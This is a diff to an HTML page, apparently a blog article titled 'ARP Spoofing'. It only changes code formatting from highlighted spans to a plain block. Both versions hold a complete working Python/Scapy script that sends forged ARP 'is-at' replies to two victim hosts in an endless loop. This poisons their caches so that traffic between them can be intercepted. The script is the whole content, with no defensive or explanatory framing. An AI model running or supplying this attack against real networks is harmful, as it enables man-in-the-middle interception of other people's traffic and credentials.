@@ -77,24 +77,25 @@ footer {
 	
 		<article>
             <h1>ARP Spoofing</h1>
-<div class="codehilite"><pre><span></span><span class="n">victim1</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">victim2</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<pre><code>:::py3
+victim1 = sys.argv[1]
+victim2 = sys.argv[2]
 
-<span class="n">mac1</span> <span class="o">=</span> <span class="n">getmacbyip</span><span class="p">(</span><span class="n">victim1</span><span class="p">)</span>
-<span class="n">mac2</span> <span class="o">=</span> <span class="n">getmacbyip</span><span class="p">(</span><span class="n">victim2</span><span class="p">)</span>
+mac1 = getmacbyip(victim1)
+mac2 = getmacbyip(victim2)
 
-<span class="n">pkt1</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac1</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="s2">&quot;is-at&quot;</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">victim2</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">victim1</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">mac1</span><span class="p">)</span>
-<span class="n">pkt2</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">mac2</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="s2">&quot;is-at&quot;</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">victim1</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">victim2</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="n">mac2</span><span class="p">)</span>
+pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=victim2, pdst=victim1, hwdst=mac1)
+pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=victim1, pdst=victim2, hwdst=mac2)
 
-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">sendp</span><span class="p">(</span><span class="n">pkt1</span><span class="p">)</span>
-    <span class="n">sendp</span><span class="p">(</span><span class="n">pkt2</span><span class="p">)</span>
+while 1:
+    sendp(pkt1)
+    sendp(pkt2)
 
-    <span class="nb">print</span><span class="p">(</span><span class="n">pkt1</span><span class="o">.</span><span class="n">summary</span><span class="p">())</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">pkt2</span><span class="o">.</span><span class="n">summary</span><span class="p">())</span>
+    print(pkt1.summary())
+    print(pkt2.summary())
 
-    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</pre></div>
+    time.sleep(1)
+</code></pre>
 		</article>
 
 	</section>
